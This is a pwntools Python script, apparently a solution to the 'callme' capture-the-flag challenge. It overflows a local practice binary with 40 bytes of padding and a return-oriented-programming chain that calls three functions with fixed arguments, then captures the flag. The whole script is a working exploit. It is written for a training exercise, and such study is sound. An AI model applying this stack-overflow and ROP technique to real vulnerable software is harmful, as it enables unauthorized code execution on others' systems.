from pwn import *


elf = context.binary = ELF('./callme')

padding = b"A" * 40

rop = ROP(elf)

callme_three = elf.sym.callme_three
callme_two = elf.sym.callme_two
callme_one = elf.sym.callme_one

rop.call(callme_one,[0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d])
rop.call(callme_two,[0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d])
rop.call(callme_three,[0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d])

exploit = padding + rop.chain()
io = process(elf.path)
io.recvuntil('> ')
io.sendline(exploit)
flag = io.recvall()
success(flag)